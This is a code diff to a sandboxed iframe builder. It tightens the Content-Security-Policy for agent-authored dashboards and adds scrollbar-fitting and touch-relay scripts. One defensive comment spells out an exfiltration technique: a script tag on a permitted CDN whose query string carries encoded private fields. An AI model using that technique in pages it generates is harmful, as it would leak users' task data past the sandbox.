@@ -41,7 +41,10 @@
 // - ArtifactDetailPage.tsx (full-screen artifact view at /artifacts/<slug>)
 
 import { parseCssColor, relativeLuminance } from './iconContrast'
-import { TAILWIND_RUNTIME_PATH } from './vendorPaths'
+import { TAILWIND_RUNTIME_PATH as TAILWIND_RUNTIME_PATH_ROOT } from './vendorPaths'
+import { withBase } from './basePath'
+/** The runtime's served path under this build's base (the bare path in the stock build). */
+const TAILWIND_RUNTIME_PATH = withBase(TAILWIND_RUNTIME_PATH_ROOT)
 import { sanitizeCssValue } from './cssSanitize'
 
 /** CSS custom properties the parent app exposes to widgets. Resolved against
@@ -74,10 +77,24 @@ export const THEME_VAR_NAMES = [
 // A null-origin iframe cannot use 'self', which is why the origin is spelled out.
 // jsdelivr/cdnjs remain for widget-authored Chart.js/D3 (same-origin + SRI is a
 // follow-up). Tailwind v4 emits CSS as inline <style>, so style-src needs no CDN.
-const cspFor = (scriptOrigin: string): string =>
+//
+// `offlineScripts` DROPS those two origins, and a crewmate's dashboard sets it.
+// `connect-src 'none'` stops a page phoning home with fetch or a WebSocket, but a
+// permitted script ORIGIN is a second channel: a page may append
+// `<script src="https://cdn.jsdelivr.net/x.js?d=<encoded fields>">` and the browser
+// sends that query out. For a widget that is the accepted trade recorded above --
+// the author is the person reading it. A crewmate's dashboard page is different on
+// both counts: it is filled with that crewmate's own task titles, summaries and
+// costs, and since the preview/apply pair it can be authored by an AGENT and
+// accepted by somebody who read the rendering rather than the markup. The product
+// already states the property -- "a chart drawn from a CDN renders as a hole rather
+// than as a call home" -- so a dashboard document permitting those origins
+// contradicted the frame's own contract. A page draws its chart from the inline
+// script it ships, which stays permitted.
+const cspFor = (scriptOrigin: string, offlineScripts = false): string =>
   "default-src 'none'; " +
-  `script-src 'unsafe-inline' ${scriptOrigin}${TAILWIND_RUNTIME_PATH} ` +
-  "https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; " +
+  `script-src 'unsafe-inline' ${scriptOrigin}${TAILWIND_RUNTIME_PATH}` +
+  (offlineScripts ? '; ' : ' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; ') +
   "style-src 'unsafe-inline'; " +
   "img-src data: blob:; font-src data:; connect-src 'none'; " +
   "form-action 'none'; base-uri 'none';"
@@ -96,6 +113,21 @@ const HEIGHT_REPORT_EPSILON_PX = 2
  * between a low and high value keeps cancelling this timer, so the shrink
  * never fires and the reporter goes quiet on the high value. */
 const HEIGHT_REPORT_SHRINK_MS = 200
+/** How long the document may stay taller than the frame's viewport, with the
+ * viewport height unchanged, before the reporter gives the frame back its own
+ * vertical scroll. A self-sizing host grows the frame to a reported height
+ * within a frame or two, and every viewport resize restarts this window, so
+ * only a frame held at a fixed height (expanded view, popout, thumbnail)
+ * outlasts it. */
+const HEIGHT_REPORT_FIT_GRACE_MS = 300
+/** How far (px) the rounded-up content height may exceed the frame's viewport
+ * and still count as fitting. A frame's CSS height is a whole pixel, but its
+ * viewport can come out up to a pixel shorter once the engine snaps it to
+ * device pixels at a fractional display scale, and clientHeight rounds that
+ * value either way. Without this slack a self-sizing frame sized to its exact
+ * report reads as too short, gets its scrollbar back, and the loop the
+ * overflow handling exists to break resumes. */
+const HEIGHT_REPORT_FIT_SLACK_PX = 1
 
 /** How long the loading indicator waits before uncovering the widget anyway.
  * This is a HANG backstop, not a compile budget: the indicator normally clears
@@ -120,7 +152,7 @@ const TW_ERROR_INLINE_HANDLER =
   `window.__mcTwError=1;window.dispatchEvent(new Event('${TW_ERROR_EVENT}'))`
 
 /** Body of the height-reporter script. Defined as a string literal — the only
- * interpolation is the two numeric tuning constants above (never LLM/user
+ * interpolation is the numeric tuning constants above (never LLM/user
  * content; the LLM `html` never reaches here). Set as a script element via
  * textContent below; the iframe re-parses and executes it via the standard
  * <script> mechanism.
@@ -133,31 +165,95 @@ const TW_ERROR_INLINE_HANDLER =
  * to the parent. The one deliberate exception is the window `load` re-report
  * below: quietness must never extend across a load event the parent can
  * observe, because parent surfaces treat post-load silence as the frame no
- * longer showing this document. */
+ * longer showing this document.
+ *
+ * It also hides the frame's own vertical scrollbar while the frame holds the
+ * whole document. A classic (space-taking) scrollbar is the one thing that
+ * feeds the frame's size back into the content's height: a frame that is a
+ * fraction of a pixel short of its content shows a scrollbar, the narrower
+ * viewport re-wraps the text taller, the frame grows, the scrollbar goes, the
+ * text re-wraps shorter, the frame shrinks, and the cycle repeats every half
+ * second. With the vertical overflow hidden while everything fits, the width
+ * the content lays out at does not depend on the frame's height, so the
+ * height settles. Once the document stays taller than a viewport that is not
+ * resizing (see HEIGHT_REPORT_FIT_GRACE_MS) the scroll comes back, so a
+ * fixed-height frame keeps scrolling its content. */
 const HEIGHT_REPORTER_BODY = `(function(){
   var EPS = ${HEIGHT_REPORT_EPSILON_PX};
   var SHRINK_MS = ${HEIGHT_REPORT_SHRINK_MS};
+  var FIT_GRACE_MS = ${HEIGHT_REPORT_FIT_GRACE_MS};
+  var FIT_SLACK = ${HEIGHT_REPORT_FIT_SLACK_PX};
   var lastSent = -1;      // last height actually posted to the parent
   var shrinkTimer = null;
   var rafId = 0;
   var raf = window.requestAnimationFrame || function(cb){ return setTimeout(cb, 16); };
   var unraf = window.cancelAnimationFrame || clearTimeout;
+  var root = document.documentElement;
+  // The document's own inline overflow-y, restored whenever the frame scrolls.
+  var authoredOverflowY = root.style.overflowY;
+  var clipped = false;
+  // Set when the grace window hands the scroll back; holds until the viewport
+  // changes height.
+  var released = false;
+  var fitTimer = null;
+  var viewH = root.clientHeight;
   function send(h){
     lastSent = h;
     parent.postMessage({type:'mc-widget-height', height:h}, '*');
   }
   function measure(){
-    // Use body.scrollHeight (content height) — NOT max(body, documentElement).
-    // documentElement.scrollHeight is at least the iframe's own viewport
-    // height, so once the iframe grows it can never report smaller, ratcheting
-    // the frame taller and taller (capped at MAX_HEIGHT) and never shrinking
-    // back to the actual content. body is content-sized (margin:0, no height),
-    // so its scrollHeight tracks the real content and can shrink.
-    return document.body.scrollHeight;
+    // The bottom of body's margin box, from the top of the document, rounded
+    // UP to a whole pixel. A frame sized to a rounded-down height is short of
+    // its content by a fraction of a pixel, which is enough to overflow.
+    //
+    // Measured on body, NOT documentElement: documentElement.scrollHeight is at
+    // least the iframe's own viewport height, so once the iframe grows it can
+    // never report smaller, ratcheting the frame taller and taller (capped at
+    // MAX_HEIGHT) and never shrinking back to the actual content. body is
+    // content-sized (no height), so its box tracks the real content and can
+    // shrink. The larger of its box and its scrollHeight covers content that
+    // overflows the box (absolutely positioned children, a fixed body height);
+    // its top offset covers its own margin, a child margin collapsed through
+    // its top edge, and any padding on html.
+    var b = document.body;
+    var r = b.getBoundingClientRect();
+    var top = r.top + (window.scrollY || 0);
+    var marginBottom = parseFloat(window.getComputedStyle(b).marginBottom) || 0;
+    return Math.ceil(top + Math.max(r.height, b.scrollHeight) + marginBottom);
+  }
+  function setClipped(on){
+    if (on === clipped) return;
+    clipped = on;
+    root.style.overflowY = on ? 'hidden' : authoredOverflowY;
+  }
+  function fits(h){
+    // clientHeight on the root element is the viewport height less any
+    // scrollbar, so a horizontal scrollbar never counts as room.
+    return h <= root.clientHeight + FIT_SLACK;
+  }
+  function fit(h){
+    if (fits(h)){
+      if (fitTimer){ clearTimeout(fitTimer); fitTimer = null; }
+      // Once the scroll is back, a fit while the scrollbar shows is not a fit
+      // at full width: content that keeps its aspect ratio gets shorter when
+      // the scrollbar narrows it, and clipping again would widen it past the
+      // viewport and toggle the scrollbar forever. Only a viewport resize
+      // (see the resize handler) clears the latch.
+      if (!released) setClipped(true);
+      return;
+    }
+    if (!clipped || fitTimer) return;
+    // Taller than the frame. A self-sizing host is about to grow it; give the
+    // scroll back only if the viewport has not resized by the time this fires.
+    fitTimer = setTimeout(function(){
+      fitTimer = null;
+      if (!fits(measure())){ released = true; setClipped(false); }
+    }, FIT_GRACE_MS);
   }
   function evaluate(){
     rafId = 0;
     var h = measure();
+    fit(h);
     if (lastSent < 0){ send(h); return; }            // first measurement
     if (Math.abs(h - lastSent) <= EPS){              // within deadband — ignore jitter
       if (shrinkTimer){ clearTimeout(shrinkTimer); shrinkTimer = null; }
@@ -198,6 +294,19 @@ const HEIGHT_REPORTER_BODY = `(function(){
     rafId = raf(evaluate);
   }
   new ResizeObserver(schedule).observe(document.body);
+  window.addEventListener('resize', function(){
+    // A frame that changes height is being sized by its host: restart the
+    // grace window so a frame catching up with a growth never gets its
+    // scrollbar back. A height-only resize leaves body's box unchanged, so the
+    // ResizeObserver above does not see it; re-measure here to re-check fit.
+    var h = root.clientHeight;
+    if (h !== viewH){
+      viewH = h;
+      released = false;
+      if (fitTimer){ clearTimeout(fitTimer); fitTimer = null; }
+    }
+    schedule();
+  });
   window.addEventListener('load', function(){
     // Re-report UNCONDITIONALLY after load, bypassing the deadband. The parent
     // surface re-arms its silence window on EVERY iframe load event (an engine
@@ -213,6 +322,9 @@ const HEIGHT_REPORTER_BODY = `(function(){
     // the parent can observe is followed by a report.
     setTimeout(function(){ lastSent = -1; schedule(); }, 100);
   });
+  // Start without a vertical scrollbar, so a frame still growing to its first
+  // report never flashes one; fit() hands the scroll back if it stays short.
+  setClipped(true);
   schedule();
   document.addEventListener('click', function(e){
  // NOTE: this isTrusted check runs INSIDE the sandboxed iframe
@@ -242,15 +354,6 @@ const HEIGHT_REPORTER_BODY = `(function(){
   });
 })();`
 
-/** Same-origin path to the Tailwind v4 browser runtime. A Vite plugin
- * (tailwindRuntimePlugin in vite.config.ts) copies @tailwindcss/browser's IIFE
- * build here at build time from the tracked npm dependency — so it is served
- * from the dashboard's own origin (not the public CDN that locked-down networks block) and is
- * NOT a committed blob (supply-chain guidance). Prefixed with window.location.origin
- * below because the sandboxed iframe is null-origin and can't use a bare path.
- * Defined once in ./vendorPaths and imported above so the consumer path can't
- * drift from vite.config.ts's dev-serve + build-emit sites. */
-
 /** Tailwind v4 browser build: dark mode is driven by a `.dark` class on <body>
  * (set below) via a custom variant — NOT the v3 `tailwind.config` global, which
  * v4 removed. The @tailwindcss/browser runtime auto-injects preflight + theme +
@@ -278,16 +381,6 @@ const COMMENT_HIGHLIGHT_CSS =
   "border-radius:10px 10px 10px 2px;box-shadow:0 1px 3px rgba(0,0,0,.35);cursor:pointer}" +
   ".mc-cmt-bubble.unread{background:var(--warn,#e0a000);color:var(--warn-fg,#1a1a1a)}"
 
-/** In-iframe comment bridge. Vanilla JS string — no LLM/user
- * interpolation (no `${}`), set via textContent and re-parsed by the iframe.
- * Brings anchored commenting + highlights into the sandboxed HTML render that
- * the parent cannot reach directly:
- *   - mouseup with a text selection -> postMessage 'mc-comment-select'
- *     {quote, prefix, suffix, rect} so the parent opens the comment popover;
- *   - 'mc-comment-highlights' {anchors:[{id,quote,prefix,suffix}]} -> wrap each
- *     matched run in <mark.mc-cmt-hl data-cid> (click -> 'mc-comment-highlight-click');
- *   - 'mc-comment-scroll-to' {id} -> scroll the mark into view + flash it;
- *   - posts 'mc-comment-ready' once so the parent pushes the initial set. */
 /** Guards against the "unsafe centering" clip: artifacts that lay out with
  * `body { display:flex; align-items:center }` (or grid `place-items:center`)
  * clip the TOP of their content — unreachable by scrolling — whenever the
@@ -455,6 +548,56 @@ const CLIPBOARD_FALLBACK_SHIM_BODY = `(function(){
  * popups are already allowed); it is a usability fix for the
  * frame-replaced-by-login-page case.
  */
+/**
+ * Touch relay: reports this frame's single-finger touches to the parent, so a
+ * host's drawer gesture can follow a drag that began over the frame.
+ *
+ * A touch that lands on an iframe is delivered to the frame's own document and
+ * never reaches the host page, so a host panel holding a full-width frame (the
+ * phone Crewmates side panel's Dashboard) had nowhere a closing drag could start.
+ * The relay posts `{type: 'mc-frame-touch', phase, x, y}` in frame coordinates;
+ * the host maps them onto the frame element and decides what, if anything, they
+ * mean.
+ *
+ * It stands down for a touch the frame's own content owns -- inside a
+ * horizontally scrollable element, an editable, or an active text selection --
+ * the same deference the host gesture applies to its own DOM. Passive listeners:
+ * the frame keeps scrolling exactly as before. Not a security boundary: any
+ * script in the frame can post the same shape, so a host must treat the
+ * messages as untrusted (accept them only from the frame's window, only while
+ * the gesture they can drive is harmless).
+ */
+const FRAME_TOUCH_RELAY_BODY = `(function(){
+  function scrollsX(n){
+    for(;n&&n.nodeType===1;n=n.parentElement){
+      if(n.scrollWidth-n.clientWidth>1){var o=getComputedStyle(n).overflowX;if(o==='auto'||o==='scroll')return true;}
+    }
+    return false;
+  }
+  function editable(n){
+    for(;n&&n.nodeType===1;n=n.parentElement){
+      if(n.isContentEditable||n.tagName==='INPUT'||n.tagName==='TEXTAREA'||n.tagName==='SELECT')return true;
+    }
+    return false;
+  }
+  var on=false;
+  function send(phase,e){
+    var t=(e.touches&&e.touches[0])||(e.changedTouches&&e.changedTouches[0]);
+    if(!t)return;
+    parent.postMessage({type:'mc-frame-touch',phase:phase,x:t.clientX,y:t.clientY},'*');
+  }
+  var opts={passive:true,capture:true};
+  window.addEventListener('touchstart',function(e){
+    if(on&&e.touches.length>1){send('cancel',e);on=false;return;}
+    var sel=window.getSelection?window.getSelection():null;
+    on=e.touches.length===1&&!scrollsX(e.target)&&!editable(e.target)&&!(sel&&!sel.isCollapsed);
+    if(on)send('start',e);
+  },opts);
+  window.addEventListener('touchmove',function(e){if(on)send('move',e);},opts);
+  window.addEventListener('touchend',function(e){if(on){on=false;send('end',e);}},opts);
+  window.addEventListener('touchcancel',function(e){if(on){on=false;send('cancel',e);}},opts);
+})();`
+
 const EXTERNAL_LINK_TARGET_SHIM_BODY = `(function(){
   window.addEventListener('click', function(e){
     var path = typeof e.composedPath === 'function' ? e.composedPath() : null;
@@ -470,6 +613,17 @@ const EXTERNAL_LINK_TARGET_SHIM_BODY = `(function(){
   }, true);
 })();`
 
+/** In-iframe comment bridge. Vanilla JS string — no LLM/user
+ * interpolation (no `${}`), set via textContent and re-parsed by the iframe.
+ * Brings anchored commenting + highlights into the sandboxed HTML render that
+ * the parent cannot reach directly:
+ *   - mouseup with a text selection -> postMessage 'mc-comment-select'
+ *     {quote, prefix, suffix, rect} so the parent opens the comment popover;
+ *   - 'mc-comment-highlights' {anchors:[{id,quote,prefix,suffix}]} -> wrap each
+ *     matched run in <mark.mc-cmt-hl data-cid> (click -> 'mc-comment-highlight-click');
+ *   - 'mc-comment-scroll-to' {id} -> scroll the mark into view + flash it;
+ *   - 'mc-comment-active' {id} -> mark that comment's highlights and bubble active;
+ *   - posts 'mc-comment-ready' once so the parent pushes the initial set. */
 const COMMENT_BRIDGE_BODY = `(function(){
   var PFX = 32;
   function selectionContext(){
@@ -699,26 +853,49 @@ const LIGHT_CANVAS_FALLBACK_VARS: Readonly<Record<(typeof THEME_VAR_NAMES)[numbe
   '--info': '#1d4ed8',
 }
 
+// The Tailwind token grammar the class regexes below share, kept in one place
+// so a new hue, stop or variant form is added once. Each piece is written as a
+// regex literal and read back through `.source`, so the escapes are exactly
+// what a hand-written literal would hold.
+//
+// TW_VARIANT_PREFIX: a token boundary, then optional variant prefixes in
+// Tailwind's full token syntax -- `hover:`, `md:`, `@md:`, `*:`, and bracketed
+// arbitrary variants such as `min-[300px]:` or `[&:hover]:` (name capped at 64
+// chars, bracket body at 256, so a long attribute value cannot make the scan
+// quadratic).
+const TW_VARIANT_PREFIX = /(?:^|[\s"'`])(?:(?=[a-zA-Z0-9@*\[-])[a-zA-Z0-9@*-]{0,64}(?:\[[^\]\s"'`]{1,256}\])?:)*/.source
+// Every default Tailwind hue, as a regex alternation.
+const TW_HUES =
+  /slate|gray|zinc|neutral|stone|red|orange|amber|yellow|lime|green|emerald|teal|cyan|sky|blue|indigo|violet|purple|fuchsia|pink|rose/.source
+// The end of a class token: end of input, a separator, or an opacity `/`.
+const TW_CLASS_END = /(?=$|[\s"'`\/])/.source
+
+/** A Tailwind background-class detector: `bg-<solid>` or `bg-<hue>-<stop>` for
+ * every default hue, behind any variant prefix. `solid` and `stops` are regex
+ * alternations (`'white'`, `'50|100|200'`). No flags: callers only `.test()`. */
+function twBgClassRe(solid: string, stops: string): RegExp {
+  return new RegExp(`${TW_VARIANT_PREFIX}bg-(?:${solid}|(?:${TW_HUES})-(?:${stops}))${TW_CLASS_END}`)
+}
+
 // Tailwind utility classes that paint a light background: `bg-white` and the
-// 50/100/200 stops of every default hue. Optional variant prefixes are
-// allowed in Tailwind's full token syntax -- `hover:`, `md:`, `@md:`, `*:`, and
-// bracketed arbitrary variants such as `min-[300px]:` or `[&:hover]:` (name
-// capped at 64 chars, bracket body at 256, so a long attribute value cannot
-// make the scan quadratic); `dark:` is handled separately below.
-const LIGHT_TAILWIND_BG_RE =
-  /(?:^|[\s"'`])(?:(?=[a-zA-Z0-9@*\[-])[a-zA-Z0-9@*-]{0,64}(?:\[[^\]\s"'`]{1,256}\])?:)*bg-(?:white|(?:slate|gray|zinc|neutral|stone|red|orange|amber|yellow|lime|green|emerald|teal|cyan|sky|blue|indigo|violet|purple|fuchsia|pink|rose)-(?:50|100|200))(?=$|[\s"'`\/])/
+// 50/100/200 stops of every default hue; `dark:` is handled separately below.
+const LIGHT_TAILWIND_BG_RE = twBgClassRe('white', '50|100|200')
 // The mirror of LIGHT_TAILWIND_BG_RE: `bg-black` and the 700-950 stops. A
 // widget carrying one of these next to a light card is a mixed palette, and
 // flipping it wholesale to light would only trade which half is unreadable.
-const DARK_TAILWIND_BG_RE =
-  /(?:^|[\s"'`])(?:(?=[a-zA-Z0-9@*\[-])[a-zA-Z0-9@*-]{0,64}(?:\[[^\]\s"'`]{1,256}\])?:)*bg-(?:black|(?:slate|gray|zinc|neutral|stone|red|orange|amber|yellow|lime|green|emerald|teal|cyan|sky|blue|indigo|violet|purple|fuchsia|pink|rose)-(?:700|800|900|950))(?=$|[\s"'`\/])/
+const DARK_TAILWIND_BG_RE = twBgClassRe('black', '700|800|900|950')
+// A `dark:` variant, bare or behind chained prefixes such as `md:dark:`.
+const DARK_VARIANT_RE = new RegExp(`${TW_VARIANT_PREFIX}dark:`)
 // Inline `background` / `background-color` declarations carrying a literal
 // color. Captures the value for a luminance check.
 const INLINE_BG_DECL_RE = /background(?:-color)?\s*:\s*(#[0-9a-f]{3,8}\b|rgba?\([^)]*\)|white\b)/gi
 // Tailwind arbitrary-value backgrounds (`bg-[#f0fdf4]`, `bg-[rgb(250,250,250)]`,
 // `bg-[white]`), which neither regex above sees. Captures the literal for the
 // same luminance check; `_` inside the brackets is Tailwind's space escape.
-const ARBITRARY_BG_CLASS_RE = /(?:^|[\s"'`])(?:(?=[a-zA-Z0-9@*\[-])[a-zA-Z0-9@*-]{0,64}(?:\[[^\]\s"'`]{1,256}\])?:)*bg-\[(#[0-9a-f]{3,8}|rgba?\([^\]]*\)|white)\]/gi
+const ARBITRARY_BG_CLASS_RE = new RegExp(
+  `${TW_VARIANT_PREFIX}${/bg-\[(#[0-9a-f]{3,8}|rgba?\([^\]]*\)|white)\]/.source}`,
+  'gi',
+)
 
 /** Relative luminance (0..1) of a CSS `#hex` / `rgb()` / `white` literal, or
  * null when it cannot be parsed. `parseCssColor` (the favicon-contrast parser)
@@ -792,7 +969,7 @@ function isLightCanvasAuthored(html: string): boolean {
   if (!html) return false
   const styled = styledSurfaces(html)
   if (/var\(\s*--/.test(styled)) return false
-  if (/(?:^|[\s"'`])(?:(?=[a-zA-Z0-9@*\[-])[a-zA-Z0-9@*-]{0,64}(?:\[[^\]\s"'`]{1,256}\])?:)*dark:/.test(styled)) return false
+  if (DARK_VARIANT_RE.test(styled)) return false
   if (DARK_TAILWIND_BG_RE.test(styled)) return false
   let sawLight = LIGHT_TAILWIND_BG_RE.test(styled)
   for (const re of [INLINE_BG_DECL_RE, ARBITRARY_BG_CLASS_RE]) {
@@ -907,6 +1084,13 @@ interface BuildSrcdocOptions {
    * injected its compiled CSS. Set for widgets heavy enough that the compile is
    * perceptible; without it a slow widget renders as a blank box. */
   showLoadingOverlay?: boolean
+  /** Drop the CDN script origins from this document's CSP, leaving inline script
+   * and the pinned same-origin Tailwind runtime. Set by a crewmate's dashboard: its
+   * page is filled with that crewmate's own crew-log data and can be authored by an
+   * agent, so a permitted script origin is an exfiltration channel that
+   * `connect-src 'none'` does not close. Off by default, so no widget surface
+   * changes. */
+  offlineScripts?: boolean
   /** Localized label for that indicator. Required when `showLoadingOverlay` is
    * set — the iframe cannot reach the parent's i18n catalog, so an untranslated
    * default here would visibly flip to English mid-load in every non-English
@@ -918,6 +1102,10 @@ interface BuildSrcdocOptions {
    * `allow-popups`: there a `_blank` link is a blocked popup (a dead click),
    * so in-frame navigation must be left alone. */
   rewriteBareLinks?: boolean
+  /** Report the frame's touches to the parent (see FRAME_TOUCH_RELAY_BODY), for
+   * a host whose drawer gesture must be able to start over the frame. Off by
+   * default: nothing else listens for them. */
+  relayTouches?: boolean
 }
 
 /** Build the srcdoc HTML for a sandboxed widget iframe. The LLM `html`
@@ -933,6 +1121,8 @@ export function buildSrcdoc({
   showLoadingOverlay = false,
   loadingLabel = '',
   rewriteBareLinks = true,
+  offlineScripts = false,
+  relayTouches = false,
 }: BuildSrcdocOptions): string {
   // A widget hardcoded for a light canvas renders on a light canvas even when
   // the dashboard is dark -- see resolveWidgetTheme. Resolved once here so the
@@ -975,7 +1165,7 @@ export function buildSrcdoc({
   // <meta CSP>
   const csp = doc.createElement('meta')
   csp.setAttribute('http-equiv', 'Content-Security-Policy')
-  csp.setAttribute('content', cspFor(scriptOrigin))
+  csp.setAttribute('content', cspFor(scriptOrigin, offlineScripts))
   head.appendChild(csp)
 
   // Tailwind v4 dark-mode directives (compiled by the runtime on load). Placed
@@ -1061,6 +1251,14 @@ export function buildSrcdoc({
     const linkTargetShim = doc.createElement('script')
     linkTargetShim.textContent = EXTERNAL_LINK_TARGET_SHIM_BODY
     body.appendChild(linkTargetShim)
+  }
+
+  // Touch relay (see FRAME_TOUCH_RELAY_BODY), ahead of the LLM html so its
+  // capture-phase listeners are registered first. textContent assignment only.
+  if (relayTouches) {
+    const touchRelay = doc.createElement('script')
+    touchRelay.textContent = FRAME_TOUCH_RELAY_BODY
+    body.appendChild(touchRelay)
   }
 
   // Parse LLM html into a document fragment via the typed DOM API. The
